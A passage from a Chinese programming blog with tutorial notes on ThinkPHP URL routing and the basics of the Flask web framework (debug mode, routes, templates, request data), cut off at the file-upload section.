<p>如果你还需要传入额外的参数，像第一条的规则array(‘Index/archive’, ‘status=1’)中的status一样传入，你看设置多个这样的参数。</p>
<p>如果你尝试在浏览器输入：</p>
<p><a href="http://localhost:8999/index.php/Home/blogs/string" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/blogs/string</a></p>
<p>ThinkPHP也给我们返回了string，但在日常的开发中，我们通常需要限制:id变量是整数，那该怎么做呢？只需要稍稍改动就可以了，写成<br><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'blogs</span>/:id\d'               =&gt; <span class="symbol">'Index</span>/read',</span><br></pre></td></tr></table></figure></p>
<p>以上\d表示限制变量id只能是数字。</p>
<p>对于可选参数，可以用[]包含表示，比如：</p>
<p>‘blogs/:year/:month/[:day]’ =&gt; array(‘Index/archive’, ‘status=1’),<br>上面的day现在就是可选参数了，你可以传入，也可以不传。</p>
<p>在ThinkPHP中，还支持在限制路由的后缀和使用正则路由。</p>
<p>限制路由后缀，通常使用在平时常见的html,htm等后缀，还是以上面的规则为例：</p>
<p>‘blogs/:id’               =&gt; array(‘Index/read’,array(‘ext’=&gt;’html’))<br>你就可以限制这条规则只能在.html的路由后缀生效。</p>
<p>2.2 正则路由<br>正则本身就是一门很大的学问，在学习ThinkPHP的正则路由之前，最好是具备一定的正则表达式的基础。</p>
<p>路由表达式支持的正则定义必须以/开头，否则就视为规则表达式，比如：</p>
<p>‘#^blog\/(\d+)$#’ =&gt; ‘Index/read’<br>这会解析为规则路由而不是正则路由，因为路由表达式并没有以/开始，所以，我们需要这样写：</p>
<p>‘/^new\/(\d{4})\/(\d{2})$/‘ =&gt; ‘Index/achive?year=:1&amp;month=:2’,<br>以上就是一条正确的正则路由。对于正则表达式中的每个正则规则子模式）部分(如\d{4}和\d{2})，如果需要在后面的路由地址中引用，可以采用:1、:2这样的方式，序号就是子模式的序号</p>
<p>2.3 静态路由<br>ThinkPHP框架其实还有一个路由机制叫静态路由，这实际上就是规则路由的静态简化版，路由定义中不包含动态参数(如上面的路由规则中id参数)，静态路由不需要遍历路由规则而是直接定位，因此执行效率会较高。静态路由采用URL_MAP_RULES来定义规则：</p>
<p>‘URL_ROUTER_ON’   =&gt; true,<br>‘URL_MAP_RULES’=&gt;array(<br>    ‘new/top’ =&gt; ‘Index/top?type=top’<br>)</p>
<p>由于Index/top?type=top中Index表示控制器，第一个top表示方法，所以我们需要在Index控制器中创建top()方法：</p>
<p>public function top(){<br>        echo “top page <br>“;<br>    }</p>
<p>你需要在IndexController中添加上面的代码，IndexController位于Application/Home/Controller之下</p>
<p>根据上面这条规则，如果我们访问到</p>
<p><a href="http://localhost:8999/index.php/Home/new/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/top</a></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1d7k1f0n1j30gn05x3yw.jpg" alt=""></p>
<p>其实我们访问的是：</p>
<p><a href="http://localhost:8999/index.php/Home/index/top/type/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/index/top/type/top</a><br>转译成就是new/top对应的是Index控制器的top()方法，传人的参数为type，参数值为top，所以就有了index/top/type/top</p>
<p>但是，当我们访问<a href="http://localhost:8999/index.php/Home/new/top/var/test尽管URL地址前面也有new/top，然而由于静态路由是完整匹配的性质，所以不会匹配到index/top/type/top" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/top/var/test尽管URL地址前面也有new/top，然而由于静态路由是完整匹配的性质，所以不会匹配到index/top/type/top</a></p>
<h2 id="课后习题-1"><a href="#课后习题-1" class="headerlink" title="课后习题"></a>课后习题</h2><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'URL_ROUTER_ON'</span>   =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="symbol">'URL_ROUTE_RULES'</span> =&gt; <span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'new</span>/:id\d'    =&gt; <span class="symbol">'Index</span>/read',</span><br><span class="line">    <span class="symbol">'new</span>/:name'    =&gt; <span class="symbol">'Index</span>/read',</span><br><span class="line">),</span><br></pre></td></tr></table></figure>
<p>在路由配置如上的情况下，修改IndexController的read()方法，使得read()方法不再绑定参数，使用$_GET方式实现访问下面的两个地址都可以正确获取相应的返回结果：</p>
<p><a href="http://localhost:8999/index.php/Home/new/8" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/8</a><br><a href="http://localhost:8999/index.php/Home/new/hello" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/new/hello</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/23/thinnkphp学习/" data-id="cjvrp4glx00305gqr8u13ix9b" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-flask框架学习" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/23/flask框架学习/" class="article-date">
  <time datetime="2019-03-23T13:21:49.000Z" itemprop="datePublished">2019-03-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/23/flask框架学习/">flask框架学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="flask运行及调试"><a href="#flask运行及调试" class="headerlink" title="flask运行及调试"></a>flask运行及调试</h1><h2 id="WSGI介绍"><a href="#WSGI介绍" class="headerlink" title="WSGI介绍"></a>WSGI介绍</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/on_1y/</span>article<span class="regexp">/details/</span><span class="number">18803563</span></span><br></pre></td></tr></table></figure>
<h2 id="一个最小的应用"><a href="#一个最小的应用" class="headerlink" title="一个最小的应用"></a>一个最小的应用</h2><p>一个最小的应用看起来像这样，新建 hello.py 文件，并向其中写入如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello, World!'</span></span><br></pre></td></tr></table></figure></p>
<p>那么这段代码做了什么？</p>
<p>首先我们导入了类 Flask。这个类的实例化将会是我们的 WSGI 应用。<br>接着，我们创建一个该类的实例。第一个参数是应用模块或包的名称，这样 Flask 才会知道去哪里寻找模板、静态文件等等。如果你使用的是单一的模块（就如本例），第一个参数应该使用 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们使用装饰器route()告诉 Flask 哪个URL才能触发我们的函数。</span><br><span class="line">定义一个函数，该函数名也是用来给特定函数生成 URLs，并且返回我们想要显示在用户浏览器上的信息。</span><br><span class="line">使用 Python 解释器运行这个文件，注意这个文件不能取名为flask.py，因为这会与 Flask 本身冲突。</span><br><span class="line"></span><br><span class="line">运行这个应用既可以使用 flask 命令行也可以使用 Python 的 -m 调用 flask，在运行之前你需要设置 FLASK_APP 的环境变量来告诉终端需要运行哪个应用，在终端执行如下命令：</span><br></pre></td></tr></table></figure></p>
<p>export FLASK_APP=hello.py<br>flask run<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">现在使用浏览器浏览http://<span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">5000</span>/，将会看到页面上的 Hello, World!。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当你运行服务器，你会注意到它只能从你自己的计算机上访问，网络中其它任何的地方都不能访问。这是因为默认情况下是 debug 模式，只有应用中的一个用户可以执行你计算机上的任意 Python 代码。</span><br><span class="line"></span><br><span class="line">如果你关闭 debug 或者信任你所在网络上的用户，可以让你的服务器对外公开可用，只需要在命令行中添加参数 --host=<span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:</span><br></pre></td></tr></table></figure></p>
<p>flask run –host=0.0.0.0</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">这让你的操作系统去监听所有公开的 IP。</span><br><span class="line"></span><br><span class="line">调试模式</span><br><span class="line">使用 flask 命令行可以非常方便的启动一个本地开发服务器，但是每次修改代码后你都需要手动重启服务器。通过前面的启动后输出显示可以发现 <span class="keyword">Environment</span> 为 production，同时调试模式未开启 <span class="keyword">Debug</span> mode: off。</span><br><span class="line"></span><br><span class="line">这样做并不好，Flask 能做得更好。如果启用了调试支持，在代码修改后服务器能够自动重载，并且如果发生错误，它会提供一个有用的调试器。</span><br><span class="line"></span><br><span class="line">为了让所有的开发者特征可用（包括调试模式），在运行服务器之前可以设置 FLASK_ENV 环境变量为 development：</span><br></pre></td></tr></table></figure>
<p>$ export FLASK_ENV=development<br>$ export FLASK_DEBUG=1<br>$ flask run<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">上述命令做了以下几件事：</span><br><span class="line"></span><br><span class="line">使调试器（debugger）可用</span><br><span class="line">启动了代码改变自动的热加载</span><br><span class="line">在 flask 应用中开启了 <span class="builtin-name">debug</span> 模式</span><br><span class="line">注意</span><br><span class="line">尽管交互式调试器(debugger)不能在分叉(forking)环境下工作(这使得它几乎不可能在生产服务器上使用)，它依然允许执行任意代码。这使它成为一个巨大的安全风险，因此它绝对不能用于生产环境。</span><br><span class="line"></span><br><span class="line">运行中的调试器的截图，从截图可以看出在页面上有终端可以执行交互式命令:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由</span></span><br><span class="line">route 装饰器是用于把一个函数绑定到一个 URL 上。</span><br></pre></td></tr></table></figure></p>
<p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p>
<p> 如果访问 /,返回 Index Page<br>@app.route(‘/‘)<br>def index():<br>    return ‘Index Page’</p>
<p> 如果访问 /hello，返回 Hello, World!<br>@app.route(‘/hello’)<br>def hello():<br>    return ‘Hello, World!’<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">访问地址 <span class="string">http:</span><span class="comment">//127.0.0.1:5000，浏览器页面会显示 Index Page；</span></span><br><span class="line">如果访问地址 <span class="string">http:</span><span class="comment">//127.0.0.1:5000/hello，浏览器页面会显示 Hello, World!。这样就实现了通过访问不同的 URL 地址从而响应不同的页面。</span></span><br><span class="line">为了给 URL 增加变量的部分，你需要把一些特定的字段标记成&lt;variable_name&gt;。这些特定的字段将作为参数传入到你的函数中。当然也可以指定一个可选的转换器通过规则&lt;<span class="string">converter:</span>variable_name&gt;将变量值转换为特定的数据类型。</span><br><span class="line">在 <span class="regexp">/home/</span>shiyanlou<span class="regexp">/Code/</span>hello.py 文件中添加如下的代码：</span><br></pre></td></tr></table></figure></p>
<p>@app.route(‘/user/<username>‘)<br>def show_user_profile(username):<br>     显示用户名<br>    return ‘User &#123;&#125;’.format(username)</username></p>
<p>@app.route(‘/post/<a href="int:post_id" target="_blank" rel="noopener">int:post_id</a>‘)<br>def show_post(post_id):<br>     显示提交整型的用户”id”的结果，注意”int”是将输入的字符串形式转换为整型数据<br>    return ‘Post &#123;&#125;’.format(post_id)</p>
<p>@app.route(‘/path/<a href="path:subpath" target="_blank" rel="noopener">path:subpath</a>‘)<br>def show_subpath(subpath):<br>     显示 /path/ 之后的路径名<br>    return ‘Subpath &#123;&#125;’.format(subpath)<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当访问 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/user/</span>shiyanlou 时，页面显示为 User shiyanlou。</span><br><span class="line"></span><br><span class="line">当访问 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/post/</span><span class="number">3</span> 时，页面显示为 Post <span class="number">3</span>。用户在浏览器地址栏上输入的都是字符串，但是在传递给 show_post 函数处理时已经被转换为了整型。</span><br><span class="line"></span><br><span class="line">当访问 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span><span class="regexp">/path/</span>file<span class="regexp">/A/</span>a.txt 时，页面显示为 Subpath file<span class="regexp">/A/</span>a.txt</span><br><span class="line"></span><br><span class="line">唯一 URLs <span class="regexp">/ 重定向行为</span></span><br></pre></td></tr></table></figure></p>
<p>@app.route(‘/projects/‘)<br>def projects():<br>    return ‘The project page’</p>
<p>@app.route(‘/about’)<br>def about():<br>    return ‘The about page<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">虽然它们看起来确实相似，但它们结尾斜线的使用在 <span class="built_in">URL</span> 定义中不同。</span><br><span class="line"></span><br><span class="line">第一种情况中，规范的 <span class="built_in">URL</span> 指向 projects 尾端有一个斜线/。这种感觉很像在文件系统中的文件夹。访问一个结尾不带斜线的 <span class="built_in">URL</span> 会被 Flask 重定向到带斜线的规范 <span class="built_in">URL</span> 去。</span><br><span class="line">当访问 <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/projects/ 时，页面会显示 The project page。</span><br><span class="line"></span><br><span class="line">然而，第二种情况的 <span class="built_in">URL</span> 结尾不带斜线，类似 UNIX-like 系统下的文件的路径名。此时如果访问结尾带斜线的 <span class="built_in">URL</span> 会产生一个<span class="number">404</span> “Not Found”错误。</span><br><span class="line">当访问 <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/about 时，页面会显示 The about page；但是当访问 <span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/about/ 时，页面就会报错 Not Found。</span><br><span class="line"></span><br><span class="line">当用户访问页面忘记结尾斜线时，这个行为允许关联的 <span class="built_in">URL</span> 继续工作，并且与 Apache 和其它的服务器的行为一致，反之则不行，因此在代码的 <span class="built_in">URL</span> 设置时斜线只可多写不可少写；另外，<span class="built_in">URL</span> 会保持唯一，有助于避免搜索引擎索引同一个页面两次。</span><br><span class="line"></span><br><span class="line"><span class="comment">## HTTP方法</span></span><br><span class="line"></span><br><span class="line">默认情况下，路由只会响应 GET 请求，但是能够通过给 route() 装饰器提供 methods 参数来改变。这里是一个例子:</span><br></pre></td></tr></table></figure></p>
<p>@app.route(‘/login’, methods=[‘GET’, ‘POST’])<br>def login():<br>    if request.method == ‘POST’:<br>        do_the_login()    如果是 POST 方法就执行登录操作<br>    else:<br>        show_the_login_form()    如果是 GET 方法就展示登录表单<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果使用 GET 方法，HEAD 方法将会自动添加进来。你不必处理它们。也能确保 HEAD 请求会按照 HTTP RFC (文档在 HTTP 协议里面描述) 要求来处理，因此你完全可以忽略这部分 HTTP 规范。</span><br><span class="line">同样地，自从 Flask <span class="number">0.6</span> 后，OPTIONS 方法也能自动为你处理。</span><br><span class="line"></span><br><span class="line"><span class="comment">## 练习</span></span><br><span class="line"></span><br><span class="line">请开发一个小应用，<span class="built_in">URL</span> 地址输入<span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/xxx（其中 xxx 表示你的名字），访问页面会显示 xxx。</span><br><span class="line"></span><br><span class="line">请完成一个应用，当 <span class="built_in">URL</span> 是<span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span>/<span class="built_in">sum</span>/<span class="keyword">a</span>/b时，其中<span class="keyword">a</span>和b都是数字，服务器返回它们的和。</span><br><span class="line">练习题 <span class="number">1</span> 的答案</span><br></pre></td></tr></table></figure></p>
<p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p>
<p>@app.route(‘/<username>‘)<br>def get_name(username):<br>    return username<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></username></p>
<p>from flask import Flask<br>app = Flask(<strong>name</strong>)</p>
<p>@app.route(‘/sum/<a href="int:a" target="_blank" rel="noopener">int:a</a>/<a href="int:b" target="_blank" rel="noopener">int:b</a>‘)<br>def get_sum(a,b):<br>    return ‘&#123;0&#125; + &#123;1&#125; = &#123;2&#125;’.format(a,b,a+b)<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 静态文件及渲染模板</span></span><br><span class="line"><span class="meta">## 静态文件</span></span><br><span class="line">动态的 web 应用同样需要静态文件。CSS 和 JavaScript 文件通常来源于此。</span><br><span class="line">理想情况下，你的 web 服务器已经配置好为它们服务，然而在开发过程中 Flask 就能够做到。只要在你的包中或模块旁边创建一个名为<span class="keyword">static</span> 的文件夹，在应用中使用 /<span class="keyword">static</span> 即可访问。</span><br><span class="line"></span><br><span class="line">给静态文件生成 URL ，使用特殊的 <span class="keyword">static</span> 端点名</span><br><span class="line">url_for(<span class="string">'static'</span>, filename=<span class="string">'style.css'</span>)</span><br><span class="line">这个文件是应该存储在文件系统上的<span class="keyword">static</span>/style.css。</span><br><span class="line">在 Python 中生成 HTML 并不好玩，实际上是相当繁琐的，因为你必须自行做好 HTML 转义以保持应用程序的安全。由于这个原因，Flask 自动为你配置好 Jinja2 模板。</span><br><span class="line"></span><br><span class="line">你可以使用方法 render_template() 来渲染模板。所有你需要做的就是提供模板的名称以及你想要作为关键字参数传入模板的变量。</span><br><span class="line"></span><br><span class="line">这里有个渲染模板的简单例子，在 /home/shiyanlou/Code 目录下新建 hello.py 文件，并向其中添加如下代码:</span><br></pre></td></tr></table></figure></p>
<p>from flask import Flask, render_template<br>app = Flask(<strong>name</strong>)</p>
<p>@app.route(‘/hello/‘)<br>@app.route(‘/hello/<name>‘)<br>def hello(name=None):    默认 name 为 None<br>    return render_template(‘hello.html’, name=name)    将 name 参数传递到模板变量中<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flask 将会在 templates 文件夹中寻找模板。因此如果你的应用是个模块，这个文件夹在模块的旁边，如果它是一个包，那么这个文件夹在你的包里面:</span><br><span class="line"></span><br><span class="line"><span class="section">比如，应用是模块（本系列实验的应用结构都是模块型）:</span></span><br></pre></td></tr></table></figure></name></p>
<p>/application.py<br>/templates<br>    /hello.html<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">/application.py</span><br><span class="line">/templates</span><br><span class="line">    /hello.html</span><br></pre></td></tr></table></figure></p>
<p>对于模板，你可以使用 Jinja2 模板的全部能力。详细信息查看官方的 Jinja2 Template Documentation 。</p>
<p>在 /home/shiyanlou/Code 目录下新建 templates 文件夹并在其中新建 hello.html 文件：<br>然后向 hello.html 模板文件中添加如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello from Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&amp;#123;% if name %&amp;#125;   <span class="comment">&lt;!-- 如果 name 不为空则将 name 渲染出来 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &amp;#123;&amp;#123; name &amp;#125;&amp;#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&amp;#123;% else %&amp;#125;   <span class="comment">&lt;!-- 如果 name 为空则打印 Hello World! --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&amp;#123;% endif %&amp;#125;</span><br></pre></td></tr></table></figure></p>
<p>按照前面的方法运行应用程序，当访问 <a href="http://127.0.0.1:5000/hello/" target="_blank" rel="noopener">http://127.0.0.1:5000/hello/</a> 时页面显示 Hello World!；<br>当访问 <a href="http://127.0.0.1:5000/hello/shiyanlou" target="_blank" rel="noopener">http://127.0.0.1:5000/hello/shiyanlou</a> 时页面显示 Hello shiyanlou!。<br>在模板中你也可以使用request，session和g对象，也能使用函数get_flashed_messages() 。</p>
<p>模板继承是十分有用的。如果想要知道模板继承如何工作的话，请阅读文档模板继承。基本的模板继承使得某些特定元素（如标题、导航和页脚）在每一页成为可能。</p>
<p>自动转义默认是开启的，因此如name包含 HTML，它将会自动转义。如果你信任一个变量，并且你知道它是安全的（例如一个模块把 wiki 标记转换到 HTML ），你可以用Markup类或|safe过滤器在模板中标记它是安全的。 在 Jinja 2 文档中，你会见到更多例子。</p>
<p>练习:<br>请创建一个模板和CSS文件，并在模板引入CSS文件，当访问网站首页时显示一个绿色的Hello ShiYanLou字样。关于HTML以及CSS的学习请参考在线教程<br>文件目录结构如下所示：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/hello.py</span></span><br><span class="line"><span class="string">/templates</span></span><br><span class="line">    <span class="string">/hello.html</span></span><br><span class="line"><span class="string">/static</span></span><br><span class="line">    <span class="string">/hello.css</span></span><br></pre></td></tr></table></figure>
<p>hello.py 文件中的代码如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br></pre></td></tr></table></figure>
<p>templates/hello.html 存放的是前端代码，如下所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&amp;#123;&amp;#123; url_for('static', filename='hello.css') &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello ShiYanLou<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>static/hello.css 存放的是 css 代码，如下所示：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">h1&amp;<span class="comment">#123;</span></span><br><span class="line"><span class="symbol">    color:</span> green<span class="comment">;</span></span><br><span class="line">    text-align: center<span class="comment">;</span></span><br><span class="line">&amp;<span class="comment">#125;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="接收请求数据"><a href="#接收请求数据" class="headerlink" title="接收请求数据"></a>接收请求数据</h1><p>首先你需要从 flask 模块中导入request:<br>from flask import request<br>当前请求的方法可以用method属性来访问。你可以用form属性来访问表单数据 (数据在 POST 或者PUT中传输)。<br>这里是上面提及到的两种属性的完整的例子:<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'POST'</span>, <span class="string">'GET'</span>])</span><br><span class="line">def login():</span><br><span class="line">    <span class="keyword">error</span> = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> valid_login(request.form[<span class="string">'username'</span>],</span><br><span class="line">                       request.form[<span class="string">'password'</span>]):</span><br><span class="line">            <span class="keyword">return</span> log_the_user_in(request.form[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">error</span> = <span class="string">'Invalid username/password'</span></span><br><span class="line">     当请求形式为“GET”或者认证失败则执行以下代码</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, <span class="keyword">error</span>=<span class="keyword">error</span>)</span><br></pre></td></tr></table></figure></p>
<p>如果在form属性中不存在上述键值会发生些什么？在这种情况下会触发一个特别的 KeyError。你可以像捕获标准的KeyError一样来捕获它，如果你不这样去做，会显示一个HTTP 400 Bad Request错误页面。所以很多情况下你不需要处理这个问题。</p>
<p>你可以用args属性来接收在URL ( ?key=value )中提交的参数:<br>searchword = request.args.get(‘key’, ‘’)<br>我们推荐使用get来访问 URL 参数或捕获KeyError，因为用户可能会修改 URL，向他们显示一个400 bad request页面不是用户友好的。</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>你能够很容易地用 Flask 处理文件上传。只要确保在你的 HTML 表单中不要忘记设置属性enctype=”multipart/form-data”，否则浏览器将不会传送文件。</p>
<p>上传的文件是存储在内存或者文件系统上一个临时位置。你可以通过请求对象中files属性访问这些文件。每个上传的文件都会存储在这个属性字典里。它表现得像一个标准的 Python file对象，但是它同样具有save()方法，该方法允许你存储文件在服务器的文件系统上。</p>
